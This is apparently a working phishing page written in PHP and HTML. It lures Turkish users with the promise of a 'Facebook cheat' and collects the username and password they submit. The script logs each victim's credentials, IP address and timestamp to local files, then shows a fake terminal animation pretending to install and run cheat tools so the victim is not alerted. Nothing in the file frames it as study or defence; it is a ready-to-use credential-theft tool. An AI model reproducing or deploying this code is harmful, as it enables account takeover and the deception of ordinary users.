<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['username']) && isset($_POST['password'])) {

$save = fopen("_command","w");
$save_2 = fopen("saved_info.txt","a+");
$username = $_POST['username'];
$password = $_POST['password'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("
+-+-+ FACEBOOK HİLE +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

 Kullanıcı Adı : ".$username."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
$saved_info = ("
<ul class='saved-box'>
	<li class='saved-title'>FACEBOOK HİLE</li><br>
	<li>Tarih         : <a>$tarih</a></li>
	<li>İp Adresi     : <a href='/ip-scan/index.php?ip=$ipaddress'>$ipaddress</a></li>
	<li>Kullanıcı Adı : <a>$username</a></li>
	<li>Şifre         : <a>$password</a></li>
</ul><hr><br>
");
fwrite($save,$command);
fwrite($save_2,$saved_info);
fclose($save);
fclose($save_2);
}else{
	echo "<script>javascript:history.go(-1)</script>";
	exit();
}
?>

<!DOCTYPE html>
<html translate="no">
    <head>
    <title>HİLE MERKEZİ</title>
<link rel="icon" href="http://localhost:4444/phishing-tools/phishing_files/icon.png" type="image/x-icon" />
<style>
@import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@500&display=swap');
body{
  margin: 0;
  padding: 0;
  font-family: Quicksan;
  background: #0e1538;
  box-sizing: border-box;
}

h1{
  font-size:150px;
  position: absolute;
  top: 25%;
  left: 50%;
  transform: translate(-50%,-50%);
  margin: 0;
  padding: 0;
  text-transform: uppercase;
  letter-spacing: 10px;
  color:white;

}

h1:before{
  content: attr(data-text);
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  color: #ADFF2F;
  overflow: hidden;
  animation: animate 7s linear infinite;
  border-right: 4px solid #ADFF2F;
  
}

.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.red-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #e50000,
    0 0 40px #e50000,
    0 0 50px #e50000,
    0 0 100px #e50000;
}

.red-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}
@keyframes animate{

  0%{
    width: 0;
  }
  50%{
    width: 99%;
  }
  100%{
    width: 0;
  }
}
.underline{
  position: absolute;
  top: 31%;
  left: 50%;
  transform: translate(-50%,-50%);
  width: 900px;
  border: 5px solid #03e9f4;;
  border-radius: 15px;
  color: #03e9f4;
}
.information {
  position: absolute;
  top: 65%;
  left: 50%;
  transform: translate(-50%,-50%);
  width: 600px;
  text-align: center;
  font-size: 30px;
  color: lime;
  padding: 50px 20px;
  border: 1px solid lime;
  border-radius: 10px; 
}
p {
  font-size: 22px;
  color: lime;
}
</style>
    </head>
    <body>
	    <h1 data-text="Loading...">Loading...</h1>
	    <div class="underline green-neon">-</div>
	    </div>
<div class="information"></div>
 <script>
const text = [`
<?php echo "<p style=\"color:white;font-size:40px;\">Merhaba $username</p>";?>
<p style="color:lime;font-size:33px;">Hile işlemi başlatılıyor..</p>
<p style="color:white;font-size:25px;">$ pip install hile-merkezi</p>
  Downloading hile-merkezi.tar.gz (3.8 kB)<br>
<p style="color:red;">     |███████████████████████████| (100%)%<p>
Collecting hile-merkezi<br>
    Successfully installed hile-merkezi<br>
<p style="color:white;font-size:25px;">$ pip install black-hope-wit</p>
  Downloading black-hope-wit.tar.gz (3.8 kB)<br>
<p style="color:red;">     |███████████████████████████| (100%)<p>
Collecting black-hope-wit<br>
Successfully installed black-hope-wit<br>
<p style="color:white;font-size:25px;">$ hile-merkezi --facebook</p>
|███████████| (50%)<br>
|█████████████████████| (100%)<br>
<p style="color:white;font-size:25px;">$ black-hope-wit --hile</p>
|███████████| (50%)<br>
|█████████████████████| (100%)<br><br>
<p style="color:lime;font-size:33px;">Lütfen bekleyiniz...</p>`]
let line = 0
let index = 0
let out = ''
let outHtml = document.querySelector('.information')

function typeLine() {
  let interval = setTimeout(() => {
    out += text[line][index]
    outHtml.innerHTML = out + ' |'
    index++
    if(index >= text[line].length){
      index = 0
      line++
      if(line == text.length){
        clearTimeout(interval)
        outHtml.innerHTML = out
        return true
      }
    }
    typeLine()
  }, getRandomInt(getRandomInt(300*2)))
}
typeLine()
function getRandomInt(max){
  return Math.floor(Math.random() * Math.floor(max))
}
</script>
    </body>
</html>
